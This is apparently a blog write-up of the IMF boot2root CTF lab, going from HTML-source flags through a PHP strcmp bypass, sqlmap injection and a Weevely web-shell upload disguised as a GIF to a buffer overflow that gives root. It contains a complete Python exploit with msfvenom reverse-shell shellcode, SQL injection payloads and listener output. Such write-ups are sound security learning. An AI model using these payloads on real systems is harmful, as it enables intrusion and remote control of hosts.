---
layout: post
title: "Hack the IMF"
date: 2018-10-06 02:45:42 -0400
comments: true
categories: [penetration testing, writeups]
keywords: imf, pentest lab, vulnhub, ctf, boot2root, imf 1, weevely, peda, gdb peda
description: IMF writeup
---

The VM description states that IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag.

The difficulty is Beginner/Moderate

<!-- more -->

``` 
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
```

Only port 80 is open, so let's begin from there.

{% img center /images/pentest/imf/home.png 'homepage' 'impossible mission force' %}

So we learn that IMF stands for Impossible Mission Force and that it's a US intelligence agency. 3-letter agencies everywhere!

{% img center /images/pentest/imf/projects.png 'projects' 'imf projects' %}

The Projects page makes for a fun read and it also reveals that the site is using PHP.

{% img center /images/pentest/imf/contact.png 'contact' 'imf contact' %}

The contact page gives us some names and mail addresses:

- Roger S. Michaels - rmichaels@imf.local
- Alexander B. Keith - akeith@imf.local
- Elizabeth R. Stone - estone@imf.local

# Flag #1 - Read the source

The first flag can be found as a HTML comment in the source of the contact.php page:

``` 
<!-- flag1{YWxsdGhlZmlsZXM=} -->
```

Decoding the base64 flag gives the hint <code>allthefiles</code>. 

# Flag #2 - JS includes

I interpreted the hint to mean bruteforce, but I tried with multiple tools and wordlists and didn't find anything. Going back through the HTML source, I noticed that several of the included Javascript files look like base64:

``` 
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
```

Putting them all together gives the string *ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==*, which yields the second flag when decoded: *flag2{aW1mYWRtaW5pc3RyYXRvcg==}*. This, in turn, gives the next hint: <code>imfadministrator</code>

# Flag #3 - Exploiting PHP strcmp function

With no other services available, everything revolves around the site. Using the above hint in the URL takes us to a hastily-made login page:

{% img center /images/pentest/imf/login.jpg 'login' 'login' %}

And in the source there's an interesting comment:

``` 
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
```

Ok, this added an interesting twist that exploits PHP functionality. Since the password is hardcoded, when attempting to log in we'd expect a string comparison to be made between the user input and the hardcoded password value. This is done in PHP through the use of the **strcmp()** function:

strcmp(string1,string2) 

This function returns:

``` 
0 - if the two strings are equal
<0 - if string1 is less than string2
>0 - if string1 is greater than string2
```

However, when reading through its [manual page](https://secure.php.net/manual/en/function.strcmp.php), there was a very interesting comment by chris at unix-ninja dot com:

``` 
strcmp() will return NULL on failure.

This has the side effect of equating to a match when using an equals comparison (==).
Instead, you may wish to test matches using the identical comparison (===), which should not catch a NULL return.

---------------------
  Example
---------------------

$variable1 = array();
$ans === strcmp($variable1, $variable2);

This will stop $ans from returning a match;

Please use strcmp() carefully when comparing user input, as this may have potential security implications in your code.
```

If we build on this example, in case the login page was codded with an equals comparison, making the function fail may exhibit the same behavior as if the strings matched. And to do that, we'll have to compare the hardcoded string with something that is not a string, like an array in this example. I used Burp to intercept the POST request that looks like this:

``` 
user=<input>&pass=<input>
```

For the user, I used Roger's username that we've discovered earlier. And then passed the password as an array:

``` 
user=rmichaels&pass[]=fail
```

And the login succeeded!

``` 
flag3{Y29udGludWVUT2Ntcw==}
Welcome, rmichaels
IMF CMS
```

The decoded flag says <code>continueTOcms</code>. And that IMF CMS is a link to http://192.168.145.130/imfadministrator/cms.php?pagename=home

# Flag #4 - SQLi

{% img center /images/pentest/imf/cms.jpg 'imf cms' 'imf cms' %}

The Upload Report page is under construction. The Disavowed list is redacted:

{% img center /images/pentest/imf/list.png 'list' 'list' %}

In the URL, observe how the pages are constructed:

``` 
cms.php?pagename=disavowlist
```

I tried inserting a single quote in the pagename parameter and sure enough, a SQL error!

``` 
 Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29
```

Time for sqlmap!

``` 
sqlmap -u http://192.168.145.130/imfadministrator/cms.php?pagename=upload --cookie "PHPSESSID=o5jl7cjuohite8ifu20fghfkq1" --dbms=MySQL --dump-all

GET parameter 'pagename' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: pagename (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: pagename=upload' AND 8343=8343 AND 'viDd'='viDd

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: pagename=upload' AND (SELECT 7643 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(7643=7643,1))),0x71766b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gVxy'='gVxy

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: pagename=upload' AND SLEEP(5) AND 'UvGQ'='UvGQ
---
[04:20:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
```

The output was huge, so here I left only the relevant part:

``` 
Database: admin
Table: pages
[4 entries]
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | pagename             | pagedata                                                                                                                                                              |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | upload               | Under Construction.                                                                                                                                                   |
| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
| 3  | tutorials-incomplete | Training classrooms available. <br /><img src="./images/whiteboard.jpg"><br /> Contact us for training.                                                               |
| 4  | disavowlist          | <h1>Disavowed List</h1><img src="./images/redacted.jpg"><br /><ul><li>*********</li><li>****** ******</li><li>*******</li><li>**** ********</li></ul><br />-Secretary |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

The admin DB contains a table with the pages that we've seen in the CMS, but it looks like there's an extra page we didn't know about! Let's see it!

{% img center /images/pentest/imf/tutorials.png 'tutorials' 'tutorials' %}

I used an online barcode reader for the QR code which revealed the flag: *flag4{dXBsb2Fkcjk0Mi5waHA=}*. And the next hint is <code>uploadr942.php</code>

# Flag #5 - PHP shell upload

Going to http://192.168.145.130/imfadministrator/uploadr942.php takes us to an upload form:

{% img center /images/pentest/imf/upload.jpg 'upload' 'upload' %}

Attempting to directly upload a PHP shell fails with an invalid file extension message. Then I tried a GIF downloaded from the internet, but another error, that the file is too large. So I just created a makeshift file with the GIF89 magic number and uploaded it with no problems. There was no mention of where ig might be located, but in the source code of the page now appeared a HTML comment:

``` 
<!-- d8988628c59f -->
```

I tried putting that in the URL with a GIF extension, but that was a no-go. So I fired up dirb to see if there are any other directories under imfadministrator:

``` 
root@kali:/usr/share/wordlists/dirb# dirb http://192.168.145.130/imfadministrator/ common.txt 

---- Scanning URL: http://192.168.145.130/imfadministrator/ ----
==> DIRECTORY: http://192.168.145.130/imfadministrator/images/                 
+ http://192.168.145.130/imfadministrator/index.php (CODE:200|SIZE:337)        
==> DIRECTORY: http://192.168.145.130/imfadministrator/uploads/        
```

Awesome, it found and uploads directory. This time I appended the previous name to this new path and it found my GIF file. So the next thing was to repeat the process of a previous challenge and try uploading a PHP shell disguised as a GIF image. But today I decided to experiment with a different type of shell.

## TTP breakdown - Weevely Weaponized web shell

Homepage: https://github.com/epinna/weevely3

**Description**

> Weevely is a web shell designed for post-exploitation purposes that can be extended over the 
> network at runtime.

> Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than
> 30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate
> privileges, and spread into the target network.

> Features

>    Shell access to the target

>    SQL console pivoting on the target

>    HTTP/HTTPS proxy to browse through the target

>    Upload and download files

>    Spawn reverse and direct TCP shells

>    Audit remote target security

>    Run Meterpreter payloads

>    Port scan pivoting on target

>    Mount the remote filesystem

>    Bruteforce SQL accounts pivoting on the target

> Agent

> The agent is a small, polymorphic PHP script hardly detected by AV and the communication protocol 
> is obfuscated within HTTP requests.

First, I installed Weevely on my machine by cloning its git repository and installing the requirements:

``` 
root@kali:/opt/weevely3# apt-get install g++ python2.7 python-pip libyaml-dev python-dev libncurses5-dev

root@kali:/opt/weevely3# pip install -r requirements.txt --upgrade
```

Then I ran the Weevely client:

``` 
root@kali:/opt/weevely3# ./weevely.py 

[+] weevely 3.6.2
[!] Error: too few arguments

[+] Run terminal or command on the target
    weevely <URL> <password> [cmd]

[+] Recover an existing session
    weevely session <path> [cmd]

[+] Generate new agent
    weevely generate <password> <path>
```

We need to generate the agent that we'll actually upload to the target server:

``` 
./weevely.py generate securepass harmless.php
Generated 'harmless.php' with password 'securepass' of 695 byte size.
```

I appended the GIF magic number at the beginning and changed the extension to GIF and successfully uploaded the shell. Then I connected to it with the Weevely client:

``` 
./weevely.py http://192.168.145.130/imfadministrator/uploads/c2fff7999be7.gif securepass

[+] weevely 3.6.2

[+] Target:	192.168.145.130
[+] Session:	/root/.weevely/sessions/192.168.145.130/c2fff7999be7_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> :help

 :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
 :audit_phpconf                Audit PHP configuration.                                             
 :audit_suidsgid               Find files with SUID or SGID flags.                                  
 :audit_filesystem             Audit the file system for weak permissions.                          
 :audit_etcpasswd              Read /etc/passwd with different techniques.                          
 :shell_php                    Execute PHP commands.                                                
 :shell_sh                     Execute shell commands.                                              
 :shell_su                     Execute commands with su.                                            
 :system_extensions            Collect PHP and webserver extension list.                            
 :system_info                  Collect system information.                                          
 :system_procs                 List running processes.                                              
 :backdoor_reversetcp          Execute a reverse TCP shell.                                         
 :backdoor_meterpreter         Start a meterpreter session.                                         
 :backdoor_tcp                 Spawn a shell on a TCP port.                                         
 :bruteforce_sql               Bruteforce SQL database.                                             
 :file_upload2web              Upload file automatically to a web folder and get corresponding URL. 
 :file_upload                  Upload file to remote filesystem.                                    
 :file_read                    Read remote file from the remote filesystem.                         
 :file_cp                      Copy single file.                                                    
 :file_clearlog                Remove string from a file.                                           
 :file_gzip                    Compress or expand gzip files.                                       
 :file_tar                     Compress or expand tar archives.                                     
 :file_enum                    Check existence and permissions of a list of paths.                  
 :file_ls                      List directory content.                                              
 :file_check                   Get attributes and permissions of a file.                            
 :file_find                    Find files with given names and attributes.                          
 :file_download                Download file from remote filesystem.                                
 :file_rm                      Remove remote file.                                                  
 :file_touch                   Change file timestamp.                                               
 :file_cd                      Change current working directory.                                    
 :file_webdownload             Download an URL.                                                     
 :file_mount                   Mount remote filesystem using HTTPfs.                                
 :file_grep                    Print lines matching a pattern in multiple files.                    
 :file_zip                     Compress or expand zip files.                                        
 :file_bzip2                   Compress or expand bzip2 files.                                      
 :file_edit                    Edit remote file on a local editor.                                  
 :sql_dump                     Multi dbms mysqldump replacement.                                    
 :sql_console                  Execute SQL query or run console.                                    
 :net_phpproxy                 Install PHP proxy on the target.                                     
 :net_curl                     Perform a curl-like HTTP request.                                    
 :net_mail                     Send mail.                                                           
 :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.     
 :net_ifconfig                 Get network interfaces addresses.                                    
 :net_scan                     TCP Port scan.                                                       

The system shell interpreter is not available in this session, use the
following command replacements to simulate a unrestricted shell.

 touch                                      file_touch       
 whoami, hostname, pwd, uname               system_info      
 gzip, gunzip                               file_gzip        
 mail                                       net_mail         
 curl                                       net_curl         
 zip, unzip                                 file_zip         
 nmap                                       net_scan         
 cd                                         file_cd          
 rm                                         file_rm          
 ps                                         system_procs     
 cat                                        file_read        
 ifconfig                                   shell_su         
 vi, vim, emacs, nano, pico, gedit, kwrite  file_edit        
 wget                                       file_webdownload 
 find                                       file_find        
 tar                                        file_tar         
 ifconfig                                   net_ifconfig     
 bzip2, bunzip2                             file_bzip2       
 ls, dir                                    file_ls          
 cp, copy                                   file_cp          
 grep                                       file_grep  
```

Now let's use it to poke around:

``` 
weevely> whoami
www-data
www-data@imf:/var/www/html/imfadministrator/uploads $ :system_info
+--------------------+-------------------------------------------------------------------------------+
| client_ip          | 192.168.145.129                                                               |
| max_execution_time | 30                                                                            |
| script             | /imfadministrator/uploads/c2fff7999be7.gif                                    |
| open_basedir       |                                                                               |
| hostname           | imf                                                                           |
| php_self           | /imfadministrator/uploads/c2fff7999be7.gif                                    |
| script_folder      | /var/www/html/imfadministrator/uploads                                        |
| uname              | Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 |
| pwd                | /var/www/html/imfadministrator/uploads                                        |
| safe_mode          | False                                                                         |
| php_version        | 7.0.32-0ubuntu0.16.04.1                                                       |
| dir_sep            | /                                                                             |
| os                 | Linux                                                                         |
| whoami             | www-data                                                                      |
| document_root      | /var/www/html                                                                 |
+--------------------+-------------------------------------------------------------------------------+
```

Listing the files in the current directory gives us the fifth flag!

``` 
www-data@imf:/var/www/html/imfadministrator/uploads $ ls -alh
total 28K
drwxr-xr-x 2 www-data www-data 4.0K Oct  7 07:29 .
drwxr-xr-x 4 www-data www-data 4.0K Oct 17  2016 ..
-rw-r--r-- 1 www-data www-data   82 Oct 12  2016 .htaccess
-rw-r--r-- 1 www-data www-data  701 Oct  7 07:29 c2fff7999be7.gif
-rw-r--r-- 1 www-data www-data   30 Oct  7 07:03 c72ad31b04e6.gif
-rw-r--r-- 1 www-data www-data   30 Oct  7 06:47 d8988628c59f.gif
-rw-r--r-- 1 www-data www-data   28 Oct 12  2016 flag5_abc123def.txt

$ cat flag5_abc123def.txt
flag5{YWdlbnRzZXJ2aWNlcw==}
```

The decoded hint is <code>agentservices</code> 

# Flag #6 - Binary exploitation

I ran a search on the filesystem for files with agent in their name and got 2 hits:

``` 
find / -type f -name agent* 
/usr/local/bin/agent
/etc/xinetd.d/agent
```

Interestingly, it seems there is an agent server around:

``` 
cat /etc/xinetd.d/agent
# default: on
# description: The agent server serves agent sessions
# unencrypted agentid for authentication.
service agent
{
       flags          = REUSE
       socket_type    = stream
       wait           = no
       user           = root
       server         = /usr/local/bin/agent
       log_on_failure += USERID
       disable        = no
       port           = 7788
}
```

So it seems the agent service is listening on port 7788 and running as root:

``` 
netstat -lnt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN  
```

Next I went to <code>/usr/local/bin</code> where the executable is located:

``` 
./agent
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 
```

We need to give it a valid agent ID for authentication. Inside the folder there is also another file:

``` 
www-data@imf:/usr/local/bin $ cat access_codes
SYN 7482,8279,9467
```

Looks like a port knocking sequence. I borrowed from an example on [ArchLinux wiki](https://wiki.archlinux.org/index.php/Port_knocking)

```
for port in 7482 8279 9467; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.145.130; done
```

And when I ran Nmap again, I found port 7788 is now open to the public:

``` 
PORT     STATE SERVICE
7788/tcp open  unknown
```

Connecting to it takes us to the agent prompt where we have to put the agent ID. I downloaded the agent executable on my system for GDB:

``` 
www-data@imf:/usr/local/bin $ :file_download agent /root/agent
```

Running strings on it also gives some interesting infomation about extraction points. Anyway, back to the agent ID. In the strings I saw a call to **strncmp**, so when running the executable I set up a breakpoint on main, then ran the program, set a breakpoint to strncmp and gave it some input. Doing so, I noticed what appears to be a hardcoded value in the comparison:

``` 
0000| 0xffffd32c --> 0x80486bf (<main+196>:	add    esp,0x10)
0004| 0xffffd330 --> 0xffffd34e ("1234\n")
0008| 0xffffd334 --> 0x804c1d0 ("48093572")
0012| 0xffffd338 --> 0x8 
0016| 0xffffd33c --> 0xf7de4e6b (add    esp,0x10)
0020| 0xffffd340 --> 0xf7f8a3fc --> 0xf7f8b200 --> 0x0 
0024| 0xffffd344 --> 0x0 
0028| 0xffffd348 --> 0x804c1d0 ("48093572")
```

I used 48093572 as the agent ID and it worked and took me to a menu:

``` 
nc -vn 192.168.145.130 7788
(UNKNOWN) [192.168.145.130] 7788 (?) open
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 48093572
Login Validated 
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
Enter selection: 1

Extraction Points:
Staatsoper, Vienna, Austria
Blenheim Palace, Woodstock, Oxfordshire, England, UK
Great Windmill Street, Soho, London, England, UK
Fawley Power Station, Southampton, England, UK
Underground Station U4 Schottenring, Vienna, Austria
Old Town Square, Old Town, Prague, Czech Republic
Drake Hotel - 140 E. Walton Pl., Near North Side, Chicago, Illinois, USA
Ashton Park, Mosman, Sydney, New South Wales, Australia
Argyle Place, The Rocks, Sydney, New South Wales, Australia

Enter selection: 2

Extraction Request
Enter extraction location: Vienna

Location: Vienna

Extraction team has been deployed.

Enter selection: 3

Enter report update: Abort extraction
Report: Abort extraction
Submitted for review.
```

Interesting. The 3rd option is the one that appears to take a variable amount of input, so maybe there's a buffer overflow lurking around. It's been a while since I've done any binary exploitation. First thing, creating the pattern that might crash the service:

``` 
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

I used the above string for the report and the program did crash:

``` 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd294 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af\224\322\377\377Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"...)
EBX: 0x0 
ECX: 0xf7f8adc7 --> 0xf8b8900a 
EDX: 0xf7f8b890 --> 0x0 
ESI: 0xf7f8a000 --> 0x1d5d8c 
EDI: 0x0 
EBP: 0x35664134 ('4Af5')
ESP: 0xffffd340 ("f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3"...)
EIP: 0x41366641 ('Af6A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41366641
```

With my binary exploitation skills unused in a long time, I had to revisit some topics and also take a look at how others solved this. Moving on, a couple of interesting things, EIP gets overwritten by Af6A, which appears at offset 168 of the payload:

``` 
./pattern_offset.rb -q Af6A -l 1000
[*] Exact match at offset 168
```

However, if we look at EAX, we see our pattern from the beginning. Which means that if we had some shellcode instead of the pattern, it would get stored in EAX, and to execute it we would need a JMP or a CALL instruction to EAX. Luckily, there's one available!

``` 
gdb-peda$ jmpcall eax
0x8048563 : call eax
```

Now, for the shellcode part. The way of feeding it to the vulnerable program will be using a Python script. I chose a reverse TCP shell for the payload and avoided badchars like nulls and newlines (line feeds and carriage returns):

``` 
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -b "\x00\x0a\x0d"
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of python file: 470 bytes
Saved as: killagent.py
```

The payload size is 95 bytes:

``` 
cat killagent.py 
buf =  ""
buf += "\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9"
buf += "\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf"
buf += "\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91"
buf += "\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30"
buf += "\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2"
buf += "\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1"
buf += "\xdc\xda\xc3\xa2"
```

Under these conditions, we would need to send a buffer of the shellcode + padding + the address of the CALL EAX instruction. Let's see the Python:

{% codeblock lang:python %} 
#!/usr/bin/python

import socket

target = "192.168.145.130"
port = 7788
agentid = "48093572\n"
menu = "3\n"

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -# b "\x00\x0a\x0d"
# Size: 95 bytes

buf =  ""
buf += "\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9"
buf += "\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf"
buf += "\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91"
buf += "\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30"
buf += "\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2"
buf += "\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1"
buf += "\xdc\xda\xc3\xa2"

offset = 168
call = "\x63\x85\x04\x08"
nop = "\x90"
pad = nop * (offset - len(buf)) # 73 bytes

buf += pad
buf += call

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.recv(1024)
s.send(agentid)
s.recv(1024)
s.send(menu)
s.recv(1024)

s.send(buf+"\n")
print "Payload sent. Check your listener."

{% endcodeblock %}

And what remains is to execute it:

``` 
root@kali:~# python agentkill.py 
Payload sent. Check your listener.
```

And on the listener, mission accomplished!

``` 
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.145.129] from (UNKNOWN) [192.168.145.130] 58634
whoami
root
ls /root
Flag.txt
TheEnd.txt
cat Flag.txt
flag6{R2gwc3RQcm90MGMwbHM=}
cat TheEnd.txt
   ____                        _ __   __   
  /  _/_ _  ___  ___  ___ ___ (_) /  / /__ 
 _/ //  ' \/ _ \/ _ \(_-<(_-</ / _ \/ / -_)
/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/ 
   __  __/_/        _                      
  /  |/  (_)__ ___ (_)__  ___              
 / /|_/ / (_-<(_-</ / _ \/ _ \             
/_/__/_/_/___/___/_/\___/_//_/             
  / __/__  ___________                     
 / _// _ \/ __/ __/ -_)                    
/_/  \___/_/  \__/\__/                     
                                           
Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
Thank you for trying this challenge and please send any feedback.

Geckom
Twitter: @g3ck0ma
Email: geckom@redteamr.com
Web: http://redteamr.com

Special Thanks
Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
Web Advice: Menztrual (@menztrual)
Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)
```

And the final decoded flag is <code>Gh0stProt0c0ls</code>! This was a really nice challenge in the later stages, especially from flag 3 onwards! Hats off to Geckom and the collaborators for this interesting VM! 

As a recap, from only a web server available to root:

- HTML source -> JS included files -> PHP function exploitation -> SQLi -> directory bruteforcing -> PHP shell upload -> binary exploitation -> root

``` 
 ________________________________________
/ It is by the fortune of God that, in   \
| this country, we have three benefits:  |
| freedom of speech, freedom of thought, |
| and the wisdom never to use either.    |
|                                        |
\ -- Mark Twain                          /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```




